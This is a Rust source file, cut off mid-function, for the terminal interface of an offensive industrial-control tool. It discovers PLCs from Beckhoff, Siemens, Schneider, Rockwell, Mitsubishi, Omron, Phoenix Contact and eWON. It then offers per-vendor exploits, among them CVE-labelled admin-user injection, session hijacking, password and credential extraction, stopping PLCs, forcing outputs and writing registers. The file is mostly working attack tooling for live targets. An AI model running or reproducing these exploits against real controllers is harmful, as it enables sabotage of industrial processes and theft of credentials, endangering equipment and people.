#![allow(clippy::too_many_lines)]
use crate::core::autodetect::{detect_device, DeviceInfo};
use crate::core::network::{get_interfaces, local_ip_for, NetworkInterface};
use crate::db::{Database, DeviceRecord};
use anyhow::Result;
use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
use ratatui::{
    backend::Backend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, Borders, Clear, List, ListItem, ListState, Paragraph, Wrap},
    Frame, Terminal,
};
use serde_json::Value;
use std::collections::{HashMap, VecDeque};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc};
use std::time::Duration;

// ─── Background events ───────────────────────────────────────────────────────

enum ScanEvent {
    DeviceFound(DeviceInfo),
    Done(String),
    Output(String),
}

// ─── Exploit catalogue ───────────────────────────────────────────────────────

struct ExploitDef {
    label: &'static str,
    needs_input: bool,
    input_hint: &'static str,
    is_monitor: bool,
}

impl ExploitDef {
    fn new(label: &'static str) -> Self {
        Self { label, needs_input: false, input_hint: "", is_monitor: false }
    }
    fn with_input(label: &'static str, hint: &'static str) -> Self {
        Self { label, needs_input: true, input_hint: hint, is_monitor: false }
    }
    fn monitor(label: &'static str) -> Self {
        Self { label, needs_input: false, input_hint: "", is_monitor: true }
    }
}

fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
    let mut defs = match vendor.to_lowercase().as_str() {
        "beckhoff" => vec![
            ExploitDef::new("Get TwinCAT Info"),
            ExploitDef::new("Set State: run"),
            ExploitDef::new("Set State: config"),
            ExploitDef::new("Reboot [CVE-2015-4051]"),
            ExploitDef::with_input("Add Admin User [CVE-2015-4051]", "username:password"),
            ExploitDef::new("Read Runtime State"),
            ExploitDef::with_input("Inject Route [ADS pivot]", "username:password"),
            ExploitDef::new("Enumerate Symbols (ADS)"),
            ExploitDef::with_input("Write Symbol (ADS)", "SymbolName=hexvalue"),
        ],
        "siemens" => vec![
            ExploitDef::with_input("Read CPU State", "|pw=password"),
            ExploitDef::with_input("Read I/O (inputs/outputs/merkers)", "|pw=password"),
            ExploitDef::with_input("Toggle CPU State (run\u{2194}stop)", "|pw=password"),
            ExploitDef::with_input("Set Outputs", "01010101[|pw=password]"),
            ExploitDef::with_input("Set Merkers", "bits:offset[|pw=password]"),
            ExploitDef::with_input("List Data Blocks", "|pw=password"),
            ExploitDef::with_input("Read Data Block", "DB1:0:64[|pw=password]"),
            ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef[|pw=password]"),
        ],
        "schneider" | "modicon" => vec![
            ExploitDef::new("Flash LED"),
            ExploitDef::new("Session Hijack: get info [CVE-2017-6026]"),
            ExploitDef::new("Session Hijack: stop PLC [CVE-2017-6026]"),
            ExploitDef::new("Session Hijack: run PLC [CVE-2017-6026]"),
            ExploitDef::with_input("Read Holding Registers", "0:100"),
            ExploitDef::with_input("Read Coils", "0:64"),
            ExploitDef::with_input("Read Input Registers", "0:100"),
            ExploitDef::with_input("Write Coil", "addr:on|off"),
            ExploitDef::with_input("Write Register", "addr:value"),
            ExploitDef::with_input("Write Multiple Registers", "start:v0,v1,..."),
            ExploitDef::new("FC90 Stop PLC [M340/Quantum]"),
            ExploitDef::new("FC90 Start PLC [M340/Quantum]"),
            ExploitDef::new("FC90 Stop TM221"),
            ExploitDef::new("FC90 Start TM221"),
            ExploitDef::with_input("FC90 Force Output", "byte:on|off|unforce"),
        ],
        "phoenix" => vec![
            ExploitDef::new("Get Passwords [CVE-2016-8366]"),
            ExploitDef::new("List Tags [CVE-2016-8380]"),
            ExploitDef::new("Read Tag Values [CVE-2016-8380]"),
            ExploitDef::with_input("Write Tag [CVE-2016-8380]", "TagName=value"),
            ExploitDef::new("Get Device Info (ProConOS)"),
            ExploitDef::with_input("Control ILC150", "stop|run:cold|warm|hot"),
            ExploitDef::with_input("Control ILC390", "stop|run"),
        ],
        "ewon" => vec![
            ExploitDef::with_input("Extract Credentials (auth bypass)", "adm:20"),
        ],
        "rockwell" | "enip" => vec![
            ExploitDef::new("Get Device Identity"),
            ExploitDef::new("List Tags"),
            ExploitDef::with_input("Read Tag", "TagName"),
            ExploitDef::with_input("Write Tag", "TagName=hexvalue"),
            ExploitDef::monitor("Monitor Tags (poll changes)"),
        ],
        "mitsubishi" => vec![
            ExploitDef::new("Get Device Info (SLMP)"),
            ExploitDef::new("Set State: run"),
            ExploitDef::new("Set State: stop"),
            ExploitDef::new("Set State: pause"),
            ExploitDef::with_input("Read D Registers", "0:50"),
            ExploitDef::with_input("Read M Bits", "0:64"),
            ExploitDef::with_input("Write D Registers", "start:v0,v1,..."),
            ExploitDef::with_input("Write M Bits", "start:0101..."),
        ],
        "omron" => vec![
            ExploitDef::new("Get Device Info (FINS)"),
            ExploitDef::with_input("Read DM Words", "start:count"),
            ExploitDef::with_input("Write DM Words", "start:v0,v1,..."),
            ExploitDef::new("CPU Status"),
            ExploitDef::new("CPU Run"),
            ExploitDef::new("CPU Stop"),
        ],
        "iec104" => vec![
            ExploitDef::new("General Interrogation"),
            ExploitDef::with_input("Single Command ON", "ioa"),
            ExploitDef::with_input("Single Command OFF", "ioa"),
            ExploitDef::with_input("Double Command", "ioa:state"),
        ],
        _ => vec![
            ExploitDef::new("Auto-detect / rescan"),
        ],
    };
    defs.push(ExploitDef::new("\u{2190} Return"));
    defs
}

const SCAN_ITEMS: &[&str] = &[
    "All vendors (parallel broadcast)",
    "Beckhoff TwinCAT   (UDP 48899)",
    "EtherNet/IP CIP    (UDP 44818)",
    "Schneider Electric (UDP 1740)",
    "Mitsubishi MELSEC  (UDP 5561)",
    "eWON IPCONF        (UDP 1507)",
    "\u{2190} Return",
];

const SCAN_BACK_IDX: usize = SCAN_ITEMS.len() - 1;

// ─── App state ───────────────────────────────────────────────────────────────

#[derive(Clone, PartialEq)]
enum Mode {
    Normal,
    IpInput,
    ScanMenu,
    ExploitMenu,
    ExploitInput,
    Search,
    Help,
    OutputZoom,
}

struct App {
    devices: Vec<DeviceRecord>,
    list_state: ListState,
    mode: Mode,
    zoom_from: Mode,
    quit_confirm: bool,
    monitor_stop: Option<Arc<AtomicBool>>,
    input_buf: String,
    output_lines: Vec<String>,
    output_scroll: usize,
    logs: VecDeque<String>,
    scan_rx: mpsc::Receiver<ScanEvent>,
    scan_tx: mpsc::Sender<ScanEvent>,
    scan_menu_sel: usize,
    exploit_defs: Vec<ExploitDef>,
    exploit_sel: usize,
    filter: String,
    filtered_indices: Vec<usize>,
    active_jobs: u32,
}

impl App {
    fn new(db: &Database) -> Result<Self> {
        let (tx, rx) = mpsc::channel();
        let devices = db.load_devices().unwrap_or_default();
        let n = devices.len();
        let filtered_indices: Vec<usize> = (0..n).collect();
        let mut list_state = ListState::default();
        if n > 0 {
            list_state.select(Some(0));
        }
        Ok(Self {
            devices,
            list_state,
            mode: Mode::Normal,
            zoom_from: Mode::Normal,
            quit_confirm: false,
            monitor_stop: None,
            input_buf: String::new(),
            output_lines: Vec::new(),
            output_scroll: 0,
            logs: VecDeque::with_capacity(200),
            scan_rx: rx,
            scan_tx: tx,
            scan_menu_sel: 0,
            exploit_defs: Vec::new(),
            exploit_sel: 0,
            filter: String::new(),
            filtered_indices,
            active_jobs: 0,
        })
    }

    fn selected_device(&self) -> Option<&DeviceRecord> {
        let idx = self.filtered_indices.get(self.list_state.selected()?)?;
        self.devices.get(*idx)
    }

    fn selected_device_ip(&self) -> Option<String> {
        self.selected_device().map(|d| d.ip.clone())
    }

    fn selected_vendor(&self) -> Option<String> {
        self.selected_device().map(|d| d.vendor.clone())
    }

    fn rebuild_filtered(&mut self) {
        if self.filter.is_empty() {
            self.filtered_indices = (0..self.devices.len()).collect();
        } else {
            let q = self.filter.to_lowercase();
            self.filtered_indices = self
                .devices
                .iter()
                .enumerate()
                .filter(|(_, d)| {
                    d.ip.to_lowercase().contains(&q) || d.vendor.to_lowercase().contains(&q)
                })
                .map(|(i, _)| i)
                .collect();
        }
        let n = self.filtered_indices.len();
        if n == 0 {
            self.list_state.select(None);
        } else {
            let cur = self.list_state.selected().unwrap_or(0).min(n - 1);
            self.list_state.select(Some(cur));
        }
    }

    fn reload(&mut self, db: &Database) {
        self.devices = db.load_devices().unwrap_or_default();
        self.rebuild_filtered();
    }

    fn log(&mut self, msg: impl Into<String>) {
        if self.logs.len() >= 200 {
            self.logs.pop_front();
        }
        self.logs.push_back(msg.into());
    }

    fn select_next(&mut self) {
        let n = self.filtered_indices.len();
        if n == 0 { return; }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some((i + 1).min(n - 1)));
    }

    fn select_prev(&mut self) {
        if self.filtered_indices.is_empty() { return; }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some(i.saturating_sub(1)));
    }

    fn drain_scan_events(&mut self, db: &Database) {
        while let Ok(ev) = self.scan_rx.try_recv() {
            match ev {
                ScanEvent::DeviceFound(info) => {
                    let fields = serde_json::to_value(&info.fields).unwrap_or_default();
                    let _ = db.upsert_device(&info.ip, &info.vendor, &fields);
                    let _ = db.log(&info.ip, &format!("discovered vendor={}", info.vendor));
                    self.log(format!("[+] {} \u{2192} {}", info.ip, info.vendor));
                    self.reload(db);
                }
                ScanEvent::Done(msg) => {
                    self.output_lines.push(format!("── done: {msg} ──"));
                    self.log(format!("[*] {msg}"));
                    self.active_jobs = self.active_jobs.saturating_sub(1);
                }
                ScanEvent::Output(line) => {
                    if self.output_lines.len() >= 500 {
                        self.output_lines.remove(0);
                    }
                    self.output_lines.push(line);
                }
            }
        }
    }

    fn open_exploit_menu(&mut self) {
        if let Some(dev) = self.selected_device() {
            self.exploit_defs = exploits_for(&dev.vendor);
            self.exploit_sel = 0;
            self.mode = Mode::ExploitMenu;
        }
    }

    fn scroll_output_up(&mut self, n: usize) {
        self.output_scroll = self.output_scroll
            .saturating_add(n)
            .min(self.output_lines.len().saturating_sub(1));
    }

    fn scroll_output_down(&mut self, n: usize) {
        self.output_scroll = self.output_scroll.saturating_sub(n);
    }

    fn enter_zoom(&mut self) {
        self.zoom_from = self.mode.clone();
        self.mode = Mode::OutputZoom;
    }

    fn exit_zoom(&mut self) {
        self.mode = self.zoom_from.clone();
    }
}

// ─── Scan workers ────────────────────────────────────────────────────────────

fn spawn_ip_scan(ip: String, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let _ = tx.send(ScanEvent::Output(format!("[*] Probing {ip}...")));
        match detect_device(&ip, 8) {
            Some(info) => {
                let _ = tx.send(ScanEvent::Output(format!("[+] {} \u{2192} {}", ip, info.vendor)));
                let _ = tx.send(ScanEvent::DeviceFound(info));
                let _ = tx.send(ScanEvent::Done(format!("Scan of {ip} complete")));
            }
            None => {
                let _ = tx.send(ScanEvent::Output(format!("[-] {ip} \u{2014} no device identified")));
                let _ = tx.send(ScanEvent::Done(format!("Scan of {ip} complete (no result)")));
            }
        }
    });
}

fn spawn_broadcast_scan(scan_idx: usize, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let ifaces = get_interfaces();
        if ifaces.is_empty() {
            let _ = tx.send(ScanEvent::Done("No network interfaces found".into()));
            return;
        }
        let iface = ifaces[0].clone();
        let _ = tx.send(ScanEvent::Output(format!(
            "[*] Using interface {} ({})", iface.name, iface.ip
        )));

        if scan_idx == 0 {
            let _ = tx.send(ScanEvent::Output("[*] Starting parallel broadcast scan...".into()));
            let mut handles = Vec::new();
            for vendor_idx in 1..=5 {
                let tx2 = tx.clone();
                let iface2 = iface.clone();
                handles.push(std::thread::spawn(move || {
                    run_vendor_broadcast(vendor_idx, &iface2, &tx2);
                }));
            }
            for h in handles {
                let _ = h.join();
            }
            let _ = tx.send(ScanEvent::Done("Parallel broadcast scan complete".into()));
        } else {
            run_vendor_broadcast(scan_idx, &iface, &tx);
            let _ = tx.send(ScanEvent::Done(format!("{} scan complete", SCAN_ITEMS[scan_idx])));
        }
    });
}

fn run_vendor_broadcast(vendor_idx: usize, iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    match vendor_idx {
        1 => scan_broadcast_beckhoff(iface, tx),
        2 => scan_broadcast_enip(iface, tx),
        3 => scan_broadcast_schneider(iface, tx),
        4 => scan_broadcast_mitsubishi(iface, tx),
        5 => scan_broadcast_ewon(iface, tx),
        _ => {}
    }
}

fn scan_broadcast_beckhoff(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::beckhoff::scan;
    if let Ok(devs) = scan::discover(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() { continue; }
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] Beckhoff: {ip} ({}, {})", d.name, d.tc_version
            )));
            let mut fields = HashMap::new();
            fields.insert("name".into(), Value::String(d.name));
            fields.insert("netid".into(), Value::String(d.netid_str));
            fields.insert("tc_version".into(), Value::String(d.tc_version));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo { vendor: "beckhoff".into(), ip, fields }));
        }
    }
}

fn scan_broadcast_enip(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::enip::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() { continue; }
            let vendor_id_u32 = u32::from_str_radix(&d.vendor_id, 16).unwrap_or(0);
            let vendor = if [1u32, 5, 77].contains(&vendor_id_u32) { "rockwell" } else { "enip" };
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] EtherNet/IP: {ip} ({})", d.product_name
            )));
            let mut fields = HashMap::new();
            fields.insert("product_name".into(), Value::String(d.product_name));
            fields.insert("vendor_id".into(), Value::String(d.vendor_id));
            fields.insert("revision".into(), Value::String(d.revision));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo { vendor: vendor.into(), ip, fields }));
        }
    }
}

fn scan_broadcast_schneider(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::schneider::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() { continue; }
            let name = d.name.clone().unwrap_or_default();
            let _ = tx.send(ScanEvent::Output(format!("[+] Schneider: {ip} ({name})")));
            let mut fields = HashMap::new();
            fields.insert("name".into(), Value::String(name));
            if let Some(fw) = d.firmware {
                fields.insert("firmware".into(), Value::String(fw));
            }
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo { vendor: "schneider".into(), ip, fields }));
        }
    }
}

fn scan_broadcast_mitsubishi(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::mitsubishi::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() { continue; }
            let _ = tx.send(ScanEvent::Output(format!("[+] Mitsubishi: {ip} ({})", d.plc_type)));
            let mut fields = HashMap::new();
            fields.insert("plc_type".into(), Value::String(d.plc_type));
            if let Some(title) = d.title {
                fields.insert("title".into(), Value::String(title));
            }
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo { vendor: "mitsubishi".into(), ip, fields }));
        }
    }
}

fn scan_broadcast_ewon(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::ewon::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            if d.response_type != "device_info" {
                continue;
            }
            if let Some(ip) = d.ip {
                if ip.parse::<std::net::IpAddr>().is_err() { continue; }
                let serial = d.serial.clone().unwrap_or_default();
                let _ = tx.send(ScanEvent::Output(format!("[+] eWON: {ip} (serial={serial})")));
                let mut fields = HashMap::new();
                if let Some(mac) = d.mac {
                    fields.insert("mac".into(), Value::String(mac));
                }
                if !serial.is_empty() {
                    fields.insert("serial".into(), Value::String(serial));
                }
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo { vendor: "ewon".into(), ip, fields }));
            }
        }
    }
}

// ─── Exploit runners ─────────────────────────────────────────────────────────

/// Column header + rule for the Rockwell tag table.
fn tag_header() -> [String; 2] {
    [
        format!(
            "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  {}",
            "#", "Name", "Type", "Dims", "Value", "Type Word"
        ),
        format!(
            "  {:─>6}  {:─<42}  {:─<14}  {:─<4}  {:─<18}  {:─<9}",
            "", "", "", "", "", ""
        ),
    ]
}

/// Format one tag row — widths match tag_header().
///
/// `base`  — base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
/// `dims`  — dimension label ("1D" / "2D" / "3D" / "-")
/// `value` — decoded live value, or "[struct]" / "[array]" / "-"
/// `raw`   — raw 2-byte type word
fn fmt_tag_row(instance_id: i64, name: &str, base: &str, dims: &str, value: &str, raw: i64) -> String {
    format!(
        "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  0x{:04x}",
        instance_id, name, base, dims, value, raw
    )
}

fn run_exploit_for(vendor: &str, idx: usize, ip: &str, input: &str, label: &str, tx: mpsc::Sender<ScanEvent>) {
    let vendor = vendor.to_lowercase();
    let ip = ip.to_string();
    let input = input.to_string();
    let label = label.to_string();

    std::thread::spawn(move || {
        let out = |msg: &str| { let _ = tx.send(ScanEvent::Output(msg.to_string())); };
        dispatch_exploit(&vendor, idx, &ip, &input, out, &tx);
        let _ = tx.send(ScanEvent::Done(format!("{label} @ {ip}")));
    });
}

#[allow(clippy::cognitive_complexity)]
fn dispatch_exploit(
    vendor: &str,
    idx: usize,
    ip: &str,
    input: &str,
    out: impl Fn(&str),
    tx: &mpsc::Sender<ScanEvent>,
) {
    match (vendor, idx) {
        ("beckhoff", 0) => exploit_beckhoff_info(ip, &out),
        ("beckhoff", 1) => exploit_beckhoff_state(ip, "run", &out),
        ("beckhoff", 2) => exploit_beckhoff_state(ip, "config", &out),
        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, &out),
        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, input, &out),
        ("siemens", 0) => exploit_siemens_cpu(ip, input, &out),
        ("siemens", 1) => exploit_siemens_io(ip, input, &out),
        ("siemens", 2) => exploit_siemens_toggle(ip, input, &out),
        ("schneider", 0) | ("modicon", 0) => exploit_schneider_flash(ip, &out),
        ("schneider", 1) | ("modicon", 1) => exploit_schneider_hijack_info(ip, &out),
        ("schneider", 2) | ("modicon", 2) => exploit_schneider_action(ip, "stop", &out),
        ("schneider", 3) | ("modicon", 3) => exploit_schneider_action(ip, "run", &out),
        ("phoenix", 0) => exploit_phoenix_passwords(ip, &out),
        ("phoenix", 1) => exploit_phoenix_list_tags(ip, &out),
        ("phoenix", 2) => exploit_phoenix_read_tags(ip, &out),
        ("phoenix", 3) => exploit_phoenix_write_tag(ip, input, &out),
        ("phoenix", 4) => exploit_phoenix_info(ip, &out),
        ("ewon", 0) => exploit_ewon_creds(ip, input, &out),
        ("rockwell", 0) | ("enip", 0) => exploit_rockwell_identity(ip, &out),
        ("rockwell", 1) | ("enip", 1) => exploit_rockwell_tags(ip, &out),
        ("rockwell", 2) | ("enip", 2) => exploit_rockwell_read(ip, input, &out),
        ("rockwell", 3) | ("enip", 3) => exploit_rockwell_write(ip, input, &out),
        ("mitsubishi", 0) => exploit_mitsubishi_info(ip, &out),
        ("mitsubishi", 1) => exploit_mitsubishi_state(ip, "run", &out),
        ("mitsubishi", 2) => exploit_mitsubishi_state(ip, "stop", &out),
        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, &out),
        ("beckhoff", 6) => exploit_beckhoff_add_route(ip, input, &out),
        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, &out),
        ("siemens", 3) => exploit_siemens_set_outputs(ip, input, &out),
        ("siemens", 4) => exploit_siemens_set_merkers(ip, input, &out),
        ("siemens", 5) => exploit_siemens_list_dbs(ip, input, &out),
        ("siemens", 6) => exploit_siemens_read_db(ip, input, &out),
        ("schneider", 4) | ("modicon", 4) => exploit_modbus_holding(ip, input, &out),
        ("schneider", 5) | ("modicon", 5) => exploit_modbus_coils(ip, input, &out),
        ("schneider", 6) | ("modicon", 6) => exploit_modbus_input(ip, input, &out),
        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, input, &out),
        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, input, &out),
        ("mitsubishi", 3) => exploit_mitsubishi_set_pause(ip, &out),
        ("mitsubishi", 4) => exploit_mitsubishi_read_d(ip, input, &out),
        ("mitsubishi", 5) => exploit_mitsubishi_read_m(ip, input, &out),
        ("mitsubishi", 6) => exploit_slmp_write_d(ip, input, &out),
        ("mitsubishi", 7) => exploit_slmp_write_m(ip, input, &out),
        ("siemens", 7) => exploit_siemens_write_db(ip, input, &out),
        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, input, &out),
        ("schneider", 7) | ("modicon", 7) => exploit_modbus_write_coil(ip, input, &out),
        ("schneider", 8) | ("modicon", 8) => exploit_modbus_write_register(ip, input, &out),
        ("schneider", 9) | ("modicon", 9) => exploit_modbus_write_registers(ip, input, &out),
        ("schneider", 10) | ("modicon", 10) => exploit_fc90_stop(ip, &out),
        ("schneider", 11) | ("modicon", 11) => exploit_fc90_start(ip, &out),
        ("schneider", 12) | ("modicon", 12) => exploit_fc90_stop_tm221(ip, &out),
        ("schneider", 13) | ("modicon", 13) => exploit_fc90_start_tm221(ip, &out),
        ("schneider", 14) | ("modicon", 14) => exploit_fc90_force(ip, input, &out),
        ("omron", 0) => exploit_omron_info(ip, &out),
        ("omron", 1) => exploit_omron_read_dm(ip, input, &out),
        ("omron", 2) => exploit_omron_write_dm(ip, input, &out),
        ("omron", 3) => exploit_omron_cpu_status(ip, &out),
        ("omron", 4) => exploit_omron_cpu_run(ip, &out),
        ("omron", 5) => exploit_omron_cpu_stop(ip, &out),
        ("iec104", 0) => exploit_iec104_gi(ip, &out),
        ("iec104", 1) => exploit_iec104_sc_on(ip, input, &out),
        ("iec104", 2) => exploit_iec104_sc_off(ip, input, &out),
        ("iec104", 3) => exploit_iec104_dc(ip, input, &out),
        _ => {
            // Auto-detect rescan: emit a DeviceFound event
            out(&format!("[*] Auto-detecting {}...", ip));
            if let Some(info) = detect_device(ip, 8) {
                out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
                let _ = tx.send(ScanEvent::DeviceFound(info));
            } else {
                out(&format!("[-] {ip} — no device identified"));
            }
        }
    }
}

fn exploit_beckhoff_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Discovering Beckhoff at {ip}..."));
    match scan::discover_ip(ip, 3, true).ok()
        .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
    {
        Some(dev) => {
            let state = scan::get_state(&dev, &local_netid);
            out(&format!("  State:   {state}"));
            match scan::get_device_info_full(&dev, &local_netid) {
                Some(info) => {
                    out(&format!("  Name:    {}", info.name));
                    out(&format!("  NetID:   {}", info.netid));
                    out(&format!("  TwinCAT: {}", info.tc_version));
                    if let Some(os) = &info.os_name { out(&format!("  OS:      {os}")); }
                }
                None => out("[-] Could not retrieve full device info"),
            }
        }
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_state(ip: &str, state: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
    match scan::discover_ip(ip, 3, true).ok().and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) }) {
        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state) {
            Ok(_) => out(&format!("[+] State command sent ({state})")),
            Err(e) => out(&format!("[-] {e}")),
        },
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_reboot(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::webcontrol;
    out(&format!("[*] Sending reboot to {ip}..."));
    match webcontrol::reboot(ip) {
        Ok(true) => out("[+] Reboot command sent"),
        Ok(false) => out("[!] Sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_beckhoff_adduser(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::webcontrol;
    let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
    out(&format!("[*] Adding user '{uname}' to {ip}..."));
    match webcontrol::add_user(ip, uname, pass) {
        Ok(true) => out("[+] User creation command sent"),
        Ok(false) => out("[!] Sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_siemens_cpu(ip: &str, input: &str, out: &impl Fn(&str)) {
    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
    use crate::vendors::siemens::s7comm;
    out(&format!("[*] Reading CPU state from {ip}..."));
    out(&format!("  CPU State: {}", s7comm::get_cpu_state(ip, 102, 5, pw)));
}

fn exploit_siemens_io(ip: &str, input: &str, out: &impl Fn(&str)) {
    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
    use crate::vendors::siemens::s7comm;
    out(&format!("[*] Reading I/O from {ip}..."));
    let data = s7comm::read_all_data(ip, 102, 5, pw);
    let [hdr, sep] = io_header();
    let mut all_addrs: Vec<String> = Vec::new();
    let mut all_vals: Vec<String> = Vec::new();
    let mut has_any = false;

    for (area, prefix) in &[("inputs", "I"), ("outputs", "Q"), ("merkers", "M")] {
        let Some(Some(bits)) = data.get(*area) else { continue };
        let mut keys: Vec<&String> = bits.keys().collect();
        keys.sort_by(|a, b| {
            let parse = |s: &str| {
                let (byte_s, bit_s) = s.split_once('.').unwrap_or((s, "0"));
                (byte_s.parse::<u32>().unwrap_or(0), bit_s.parse::<u8>().unwrap_or(0))
            };
            parse(a).cmp(&parse(b))
        });
        out(&format!("  [{area}]"));
        out(&hdr);
        out(&sep);
        for key in &keys {
            let val = bits[*key];
            let (byte_s, bit_s) = key.split_once('.').unwrap_or((key, "0"));
            let addr = format!("{prefix}{byte_s}.{bit_s}");
            out(&fmt_io_row(&addr, bit_s, val));
            all_addrs.push(addr);
            all_vals.push(if val != 0 { "true".to_string() } else { "false".to_string() });
        }
        out(&sep);
        has_any = true;
    }

    if !has_any {
        out("[-] No I/O data received");
        return;
    }
    let points: Vec<(&str, Option<&str>, &str)> = all_addrs
        .iter()
        .zip(all_vals.iter())
        .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
        .collect();
    save_and_diff(ip, "s7", &points, out);
}

fn exploit_siemens_toggle(ip: &str, input: &str, out: &impl Fn(&str)) {
    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
    use crate::vendors::siemens::s7comm;
    out(&format!("[*] Toggling CPU state on {ip}..."));
    if s7comm::change_cpu_state(ip, 102, 5) {
        out(&format!("[+] New state: {}", s7comm::get_cpu_state(ip, 102, 5, pw)));
    } else {
        out("[-] Failed to toggle CPU state");
    }
}

fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::flash_led;
    out(&format!("[*] Flashing LED on {ip}..."));
    match flash_led::flash_led_ip(ip) {
        Ok(_) => out("[+] Flash LED command sent"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_schneider_hijack_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::session_hijack;
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip) {
        Some(s) => {
            out(&format!("[+] Cookie:          {}", s.cookie_value));
            out(&format!("    Power-on count:  {}", s.power_on_count));
            session_hijack::get_device_info(ip, &s.cookie_value, "Administrator");
        }
        None => out("[-] Failed to get session cookie"),
    }
}

fn exploit_schneider_action(ip: &str, action: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::session_hijack;
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip) {
        Some(s) => {
            out(&format!("[+] Cookie: {}", s.cookie_value));
            if session_hijack::control_plc(ip, &s.cookie_value, "Administrator", action) {
                out(&format!("[+] PLC {action} command sent"));
            } else {
                out(&format!("[-] Failed to {action} PLC"));
            }
        }
        None => out("[-] Failed to get session cookie"),
    }
}

fn exploit_phoenix_passwords(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Retrieving passwords from {ip}..."));
    match webvisit::retrieve_passwords(ip) {
        Ok(entries) => {
            for e in &entries {
                if let Some(p) = &e.password {
                    out(&format!("  Level {}: {p}", e.user_level));
                } else if let Some(h) = &e.hash {
                    out(&format!("  Level {} [sha256]: {h}", e.user_level));
                }
            }
            out(&format!("[+] {} entry/entries found", entries.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_list_tags(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Listing tags on {ip}..."));
    match webvisit::get_tags(ip) {
        Ok((project, tags)) => {
            out(&format!("  Project: {project}"));
            for (i, t) in tags.iter().enumerate() {
                out(&format!("  [{i:>4}] {t}"));
            }
            out(&format!("[+] {} tag(s)", tags.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_read_tags(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Reading tag values from {ip}..."));
    let tags_result = webvisit::get_tags(ip);
    match tags_result {
        Ok((_, tags)) => match webvisit::read_tag_values(ip, &tags) {
            Ok(vals) => {
                for (name, val) in &vals {
                    out(&format!("  {name}: {val}"));
                }
            }
            Err(e) => out(&format!("[-] {e}")),
        },
